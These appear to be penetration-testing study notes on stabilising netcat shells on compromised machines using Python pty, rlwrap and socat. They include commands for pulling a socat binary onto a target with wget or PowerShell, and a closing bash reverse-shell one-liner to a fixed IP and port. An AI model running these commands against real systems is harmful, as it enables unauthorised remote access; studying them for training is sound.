 **Below we are discussing three techniques to stabilise netcat shell**

1. Technique 1: Python
- The first technique we'll be discussing is applicable only to Linux boxes, as they will nearly always have Python installed by default.
- This is a three stage process:
	1. The first thing to do is use `python3 -c 'import pty;pty.spawn("/bin/bash")'`, which uses Python to spawn a better featured bash shell; note that some targets may need the version of Python specified. If this is the case, replace `python` with `python2` or `python3` as required.
		- At this point our shell will look a bit prettier, but we still won't be able to use tab autocomplete or the arrow keys, and Ctrl + C will still kill the shell.
	2. Step two is: `export TERM=xterm` -- this will give us access to term commands such as `clear`.
	3. Finally (and most importantly) we will background the shell using Ctrl + Z. Back in our own terminal we use `stty raw -echo; fg`. This does two things:
		- first, it turns off our own terminal echo (which gives us access to tab autocompletes, the arrow keys, and Ctrl + C to kill processes).
		- It then foregrounds the shell, thus completing the process.
**The full technique can be seen here:**
![[shells5.png]]
**Note** - if the shell dies, any input in your own terminal will not be visible (as a result of having disabled terminal echo). To fix this, type `reset` and press enter.  

---

2. Technique 2: rlwrap
	- rlwrap is a program which, in simple terms, gives us access to history, tab autocompletion and the arrow keys immediately upon receiving a shell_;_ however, s_ome_ manual stabilisation must still be utilised if you want to be able to use Ctrl + C inside the shell.
	- rlwrap is not installed by default on Kali, so first install it with
```python
sudo apt install rlwrap
```

To use rlwrap, we invoke a slightly different listener:
```python
rlwrap nc -lvnp <port>
```

- This technique is particularly useful when dealing with Windows shells, which are otherwise notoriously difficult to stabilise.
- When dealing with a Linux target, it's possible to completely stabilise, by using the same trick as in step three of the previous technique: background the shell with Ctrl + Z, then use `stty raw -echo; fg` to stabilise and re-enter the shell.

3.  Technique 3: Socat
	- The third easy way to stabilise a shell is quite simply to use an initial netcat shell as a stepping stone into a more fully-featured socat shell.
	- this technique is limited to Linux targets, as a Socat shell on Windows will be no more stable than a netcat shell.
	- To accomplish this method of stabilisation we would first transfer a [socat static compiled binary](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat?raw=true) (a version of the program compiled to have no dependencies) up to the target machine.
		- A typical way to achieve this would be using a webserver on the attacking machine inside the directory containing your socat binary (`sudo python3 -m http.server 80`), then, on the target machine, using the netcat shell to download the file. On Linux this would be accomplished with curl or wget (`wget <LOCAL-IP>/socat -O /tmp/socat`).
		- For the sake of completeness: in a Windows CLI environment the same can be done with Powershell, using either Invoke-WebRequest or a webrequest system class, depending on the version of Powershell installed (`Invoke-WebRequest -uri <LOCAL-IP>/socat.exe -outfile C:\\Windows\temp\socat.exe`)
**Changing your terminal tty size**
1. First, open another terminal and run `stty -a`. 
![[shells6.png]]
Note down the values for "rows" and columns:

2. Next, in your reverse/bind shell, type in:
`stty rows <number>`  

and

`stty cols <number>`

bash -i >& /dev/tcp/10.17.47.177/4444 0>&1

